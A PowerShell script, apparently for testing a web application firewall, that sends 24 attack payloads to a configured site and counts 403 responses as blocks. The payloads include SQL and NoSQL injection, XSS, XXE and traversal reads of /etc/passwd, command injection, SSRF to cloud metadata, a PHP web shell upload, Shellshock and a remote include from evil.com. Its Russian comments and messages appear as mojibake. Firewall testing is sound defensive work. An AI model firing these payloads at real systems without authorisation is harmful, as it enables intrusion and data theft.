# WAF —Ç–µ—Å—Ç—ã —Å –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏–µ–º PowerShell

# –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è - —É–∫–∞–∂–∏—Ç–µ –∑–¥–µ—Å—å —Ü–µ–ª–µ–≤–æ–π —Å–∞–π—Ç
$BASE_URL = "https://msproject.site.net/console"

# –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –¥–ª—è —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏
$script:TOTAL_TESTS = 24
$script:BLOCKED = 0
$script:ALLOWED = 0
$script:ERRORS = 0
$script:CURRENT_TEST = 0
$script:RESULTS = @()

# –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–ø–æ–ª–Ω–µ–Ω–∏—è –∏ –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–µ—Å—Ç–∞
function Run-Test($testName, $scriptBlock) {
    $SCRIPT:CURRENT_TEST++
    Write-Host "`n=== –¢–µ—Å—Ç $CURRENT_TEST`: $testName ===" -ForegroundColor Cyan
    Write-Host "–í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –∑–∞–ø—Ä–æ—Å..." -ForegroundColor Gray
    
    $result = $null
    $errorDetails = $null
    $txID = $null
    $statusCode = 0
    
    try {
        # –í—ã–ø–æ–ª–Ω–µ–Ω–∏–µ —Å–∫—Ä–∏–ø—Ç–±–ª–æ–∫–∞ —Å —Ç–µ—Å—Ç–æ–º
        $result = & $scriptBlock
        $statusCode = 200  # –ü—Ä–µ–¥–ø–æ–ª–∞–≥–∞–µ–º —É—Å–ø–µ—à–Ω—ã–π –æ—Ç–≤–µ—Ç –ø–æ —É–º–æ–ª—á–∞–Ω–∏—é
        $isBlocked = $false
    } catch {
        $errorDetails = $_.Exception.Message
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –µ—Å–ª–∏ –æ—à–∏–±–∫–∞ —Å–≤—è–∑–∞–Ω–∞ —Å 403 Forbidden - —ç—Ç–æ –£–°–ü–ï–®–ù–ê–Ø –±–ª–æ–∫–∏—Ä–æ–≤–∫–∞ WAF
        if ($errorDetails -match "(403)" -or $errorDetails -match "Forbidden") {
            $statusCode = 403
            $isBlocked = $true
            
            # –ü–æ–ø—ã—Ç–∫–∞ –∏–∑–≤–ª–µ—á—å Transaction ID –∏–∑ —Å–æ–æ–±—â–µ–Ω–∏—è –æ–± –æ—à–∏–±–∫–µ
            if ($errorDetails -match "Transaction ID: ([a-f0-9-]+)") {
                $txID = $matches[1]
            }
        } else {
            # –≠—Ç–æ –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –æ—à–∏–±–∫–∞ –≤ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Ç–µ—Å—Ç–∞
            $statusCode = 0
            $isBlocked = $false
            $SCRIPT:ERRORS++
        }
    }
    
    # –û–±—Ä–∞–±–æ—Ç–∫–∞ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–∞ –≤ –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏ –æ—Ç —Å—Ç–∞—Ç—É—Å–∞
    if ($statusCode -eq 403) {
        Write-Host "‚úÖ –°—Ç–∞—Ç—É—Å: –ó–ê–ë–õ–û–ö–ò–†–û–í–ê–ù–û (HTTP $statusCode)" -ForegroundColor Green
        $SCRIPT:BLOCKED++
        $status = "–ó–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω"
        $SCRIPT:RESULTS += "‚úÖ $testName`: $status (HTTP $statusCode)"
        
        if ($txID) {
            Write-Host "   üîë Transaction ID: $txID" -ForegroundColor Yellow
            $SCRIPT:RESULTS += "   üîë Transaction ID: $txID"
        }
    } elseif ($statusCode -eq 0) {
        Write-Host "‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ –∑–∞–ø—Ä–æ—Å–∞: $errorDetails" -ForegroundColor Red
        Write-Host "`n–î–µ—Ç–∞–ª–∏ –æ—à–∏–±–∫–∏:" -ForegroundColor Red
        Write-Host "$errorDetails" -ForegroundColor Red
        $status = "–û—à–∏–±–∫–∞"
        $SCRIPT:RESULTS += "‚ùå $testName`: $status - $errorDetails"
    } else {
        Write-Host "‚ö†Ô∏è –°—Ç–∞—Ç—É—Å: –†–ê–ó–†–ï–®–ï–ù–û (HTTP $statusCode)" -ForegroundColor Yellow
        $SCRIPT:ALLOWED++
        $status = "–†–∞–∑—Ä–µ—à–µ–Ω"
        $SCRIPT:RESULTS += "‚ö†Ô∏è $testName`: $status (HTTP $statusCode)"
        
        if ($result) {
            Write-Host "`n–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –æ—Ç–≤–µ—Ç–∞:" -ForegroundColor Yellow
            Write-Host "$result" -ForegroundColor Gray
        }
    }
}

# –ù–∞—á–∞–ª–æ —Ç–µ—Å—Ç–æ–≤
Write-Host "üöÄ –ù–∞—á–∏–Ω–∞–µ–º —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ –∞—Ç–∞–∫ –Ω–∞ WAF..." -ForegroundColor Magenta
Write-Host "üìã –í—Å–µ–≥–æ –∑–∞–ø–ª–∞–Ω–∏—Ä–æ–≤–∞–Ω–æ —Ç–µ—Å—Ç–æ–≤: $TOTAL_TESTS" -ForegroundColor Cyan
Write-Host "üéØ –¶–µ–ª–µ–≤–æ–π —Å–∞–π—Ç: $BASE_URL" -ForegroundColor Cyan
Write-Host ""

# –¢–µ—Å—Ç 1: SQL Injection
Run-Test "SQL Injection" {
    Invoke-WebRequest -Uri "$BASE_URL/search?q=1'+OR+'1'%3D'1" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 2: Cross-Site Scripting (HTML)
Run-Test "Cross-Site Scripting (HTML)" {
    Invoke-WebRequest -Uri "$BASE_URL/search" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/x-www-form-urlencoded"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -Body "q=<script>alert(1)</script>" `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 3: Cross-Site Scripting (URL)
Run-Test "Cross-Site Scripting (URL)" {
    Invoke-WebRequest -Uri "$BASE_URL/redirect?url=javascript:alert(1)" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 4: XML External Entities (XXE)
Run-Test "XML External Entities (XXE)" {
    $xxePayload = @"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<test>&xxe;</test>
"@
    Invoke-WebRequest -Uri "$BASE_URL/api/xml" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/xml"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -Body $xxePayload `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 5: Path Traversal
Run-Test "Path Traversal" {
    Invoke-WebRequest -Uri "$BASE_URL/files?file=../../../etc/passwd" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 6: NoSQL Injection
Run-Test "NoSQL Injection" {
    $nosqlPayload = '{"search": {"$where": "function() { return true; }"}, "limit": 1}'
    Invoke-WebRequest -Uri "$BASE_URL/search" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/json"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -Body $nosqlPayload `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 7: OS Command Injection
Run-Test "OS Command Injection" {
    Invoke-WebRequest -Uri "$BASE_URL/status?cmd=ping;cat%20/etc/passwd" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 8: Server-Side Request Forgery (SSRF)
Run-Test "Server-Side Request Forgery (SSRF)" {
    Invoke-WebRequest -Uri "$BASE_URL/proxy?url=http://169.254.169.254/latest/meta-data/" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 9: Local File Inclusion (LFI)
Run-Test "Local File Inclusion (LFI)" {
    Invoke-WebRequest -Uri "$BASE_URL/include?file=../../../etc/passwd%00" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 10: Server-Side Template Injection (SSTI)
Run-Test "Server-Side Template Injection (SSTI)" {
    Invoke-WebRequest -Uri "$BASE_URL/profile" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/x-www-form-urlencoded"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -Body "name={{7*7}}&email=test@example.com" `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 11: XPath Injection - –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è
Run-Test "XPath Injection" {
    Invoke-WebRequest -Uri "$BASE_URL/users?xpath=/users/user%5Busername/text()=%27admin%27%20or%20%271%27=%271%27%5D" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 12: XML Injection
Run-Test "XML Injection" {
    $xmlInjectionPayload = @"
<?xml version="1.0" encoding="UTF-8"?>
<user>
  <id>1 OR 1=1</id>
  <name>test' OR '1'='1</name>
</user>
"@
    Invoke-WebRequest -Uri "$BASE_URL/api/xml" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/xml"
            "Accept" = "application/xml"
            "User-Agent" = "sqlmap/1.4.7"
        } `
        -Body $xmlInjectionPayload `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 13: Open Redirect
Run-Test "Open Redirect" {
    Invoke-WebRequest -Uri "$BASE_URL/redirect?url=http://evil.com/shell.php" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 14: Web Shell Upload
Run-Test "Web Shell Upload" {
    $boundary = "---------------------------974767299852498929531610575"
    $shellPayload = @"
-----------------------------974767299852498929531610575
Content-Disposition: form-data; name="file"; filename="shell.php.png"
Content-Type: image/png

GIF87a;
<?php
  system('id');
?>
-----------------------------974767299852498929531610575--
"@
    Invoke-WebRequest -Uri "$BASE_URL/upload" `
        -Method POST `
        -Headers @{
            "Content-Type" = "multipart/form-data; boundary=$boundary"
            "User-Agent" = "Nessus/8.10.1"
            "X-Requested-With" = "XMLHttpRequest"
        } `
        -Body $shellPayload `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 15: Cross-Site Request Forgery (CSRF) - –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–Ω–∞—è –≤–µ—Ä—Å–∏—è
Run-Test "Cross-Site Request Forgery (CSRF)" {
    Invoke-WebRequest -Uri "$BASE_URL/login" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/x-www-form-urlencoded"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            "Origin" = "evil.com"
            "Referer" = "evil.com/fake.html"
            "X-CSRF-Token" = "fake-token"
        } `
        -Body "username=<script>alert(document.cookie)</script>&password=password&action=login" `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 16: Vulnerability Scanner
Run-Test "Vulnerability Scanner" {
    Invoke-WebRequest -Uri "$BASE_URL/include?file=../../../../etc/passwd%00" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Nessus SOAP"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 17: Automated Bot User Agent
Run-Test "Automated Bot User Agent" {
    $botPayload = '{"search": {"$where": "function() { return true; }"}, "limit": 1}'
    Invoke-WebRequest -Uri "$BASE_URL/search" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/json"
            "User-Agent" = "Googlebot/2.1 (+http://www.google.com/bot.html)"
        } `
        -Body $botPayload `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 18: Malformed HTTP Request
Run-Test "Malformed HTTP Request" {
    Invoke-WebRequest -Uri "$BASE_URL/files?file=../../../etc/passwd" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            "X-Custom-IP-Authorization" = "127.0.0.1"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 19: Response Splitting
Run-Test "Response Splitting" {
    Invoke-WebRequest -Uri "$BASE_URL/include?file=http://evil.com/shell.php" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 20: JWT Attack (None Algorithm)
Run-Test "JWT Attack (None Algorithm)" {
    $jwtToken = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiYWRtaW4iOnRydWV9."
    Invoke-WebRequest -Uri "$BASE_URL/api/admin?alg=none&debug=true" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
            "Authorization" = "Bearer $jwtToken"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 21: Large Body Test
Run-Test "Large Body Test" {
    Write-Host "–ì–µ–Ω–µ—Ä–∞—Ü–∏—è –±–æ–ª—å—à–æ–≥–æ payload..." -ForegroundColor Yellow
    $bigPayload = @{
        data = "A" * 50000
    } | ConvertTo-Json
    
    Invoke-WebRequest -Uri "$BASE_URL/api/data" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/json"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -Body $bigPayload `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 22: LFI with PHP Wrapper
Run-Test "LFI with PHP Wrapper" {
    Invoke-WebRequest -Uri "$BASE_URL/download?file=php://filter/convert.base64-encode/resource=/etc/passwd&type=lfi" `
        -Method GET `
        -Headers @{
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 23: RCE via User-Agent
Run-Test "RCE via User-Agent" {
    Invoke-WebRequest -Uri "$BASE_URL/" `
        -Method GET `
        -Headers @{
            "User-Agent" = "() { :; }; /bin/bash -c `"cat /etc/passwd`""
        } `
        -UseBasicParsing -ErrorAction Stop
}

# –¢–µ—Å—Ç 24: GraphQL Introspection
Run-Test "GraphQL Introspection" {
    $graphqlPayload = '{"query": "query{__schema{types{name,fields{name}}}}"}'
    Invoke-WebRequest -Uri "$BASE_URL/graphql" `
        -Method POST `
        -Headers @{
            "Content-Type" = "application/json"
            "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
        } `
        -Body $graphqlPayload `
        -UseBasicParsing -ErrorAction Stop
}

# –û—Ç–æ–±—Ä–∞–∂–µ–Ω–∏–µ –æ—Ç—á–µ—Ç–∞ –æ —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏
Write-Host ""
Write-Host "üìä ====== –û–¢–ß–ï–¢ –û –¢–ï–°–¢–ò–†–û–í–ê–ù–ò–ò PTAF PRO ======" -ForegroundColor Cyan
Write-Host ""
Write-Host "üéØ –í—Å–µ–≥–æ —Ç–µ—Å—Ç–æ–≤: $script:TOTAL_TESTS" -ForegroundColor White
Write-Host "üõ°Ô∏è –£—Å–ø–µ—à–Ω–æ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ: $script:BLOCKED" -ForegroundColor Green
Write-Host "‚ö†Ô∏è –†–∞–∑—Ä–µ—à–µ–Ω–æ (–Ω–µ –∑–∞–±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–æ): $script:ALLOWED" -ForegroundColor Yellow
Write-Host "‚ùå –û—à–∏–±–æ–∫: $script:ERRORS" -ForegroundColor Red
Write-Host ""
Write-Host "üìù –î–µ—Ç–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç –ø–æ —Ç–µ—Å—Ç–∞–º:" -ForegroundColor Cyan
Write-Host ""

foreach ($result in $script:RESULTS) {
    Write-Host $result
}

Write-Host ""
Write-Host "üéØ ======================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "‚ú® –í—Å–µ —Ç–µ—Å—Ç—ã –≤—ã–ø–æ–ª–Ω–µ–Ω—ã!" -ForegroundColor Green
Write-Host "–ö–æ–¥ 403 Forbidden –æ–∑–Ω–∞—á–∞–µ—Ç —É—Å–ø–µ—à–Ω–æ–µ –±–ª–æ–∫–∏—Ä–æ–≤–∞–Ω–∏–µ WAF" -ForegroundColor Yellow 